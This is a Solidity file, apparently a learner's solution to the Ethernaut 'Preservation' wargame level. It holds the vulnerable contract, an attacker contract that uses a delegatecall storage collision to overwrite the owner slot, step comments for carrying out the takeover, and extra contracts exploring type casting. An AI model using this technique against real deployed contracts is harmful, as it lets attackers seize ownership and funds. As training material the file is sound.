pragma solidity ^0.8.0;


// steps
//  -> deploy hack -> get address -> calculate( adrs )-> i= get address value in unint datatype 
//  -> timeZone1Library(i) -> it will update slot 0
//  -> again call timeZone1Library(123) -> it will update slot 2 


contract hack 
{
  // override contract storage slots 
  address public a; // update timeZone1Library  == slot0 
  address public b; // update timeZone2Library  == slot1 
  address public c; // update owner  == slot2 

  function setTime(uint _time) public 
  {
      c = msg.sender;
      
  }
}

contract calculate // calculate address in uint datatype that i can pass in setFirstTime() that will update slot 0 because it timeZone1Library contract is similar to  LibraryContract sample that are given so uint storedTime;  will override   address public timeZone1Library;  contract storage slor (=0)
{
    uint public  i;
    constructor(address hack)
    {
        i = uint256(uint160(address(hack)));
    }
}


contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}


contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}


//_____________________________________For better Understanding pupose__________________________________________________________________________________________
// a,c are different
contract B 
{
  bytes30 public a;
  uint240 public b; 
  bytes30 public c;
  bytes20 public d;
  function f1() public  
  {
    // Both a,b  == 30 bytes == 240 bits = 60 Hexadecimal
    a= bytes30(bytes20(0x8DAB96e9241b68A488948c1421e4776D333b8d4B));   
    b= uint240(uint160(0x8DAB96e9241b68A488948c1421e4776D333b8d4B));
    c= bytes30(b);
    d= bytes20(c);
  }
}
// a stores the bytes 0x8dab...0000 as-is, including the padding.
// c stores the bytes 0x0000...8dab to represent the integer value correctly in big-endian format.




// Pending -> check using javascript
contract C 
{
  // in Contract storage both have same hash value
  // a,b have just different datatye but have same value    --> indirectly using keccak256  -> give same hash
  bytes30 public a; // slot 0
  uint240 public b; // slot 1
  function f1() public  
  {
    // Both a,b  == 30 bytes == 240 bits = 60 Hexadecimal
    a= bytes30(bytes20(0x8DAB96e9241b68A488948c1421e4776D333b8d4B));   
    b= uint240(uint160(0x8DAB96e9241b68A488948c1421e4776D333b8d4B)); 
  }

 //     [0]0x00008dab96e9241b68a488948c1421e4776d333b8d4b00000000000000000000
//      [1]0x0000000000000000000000008dab96e9241b68a488948c1421e4776d333b8d4b

}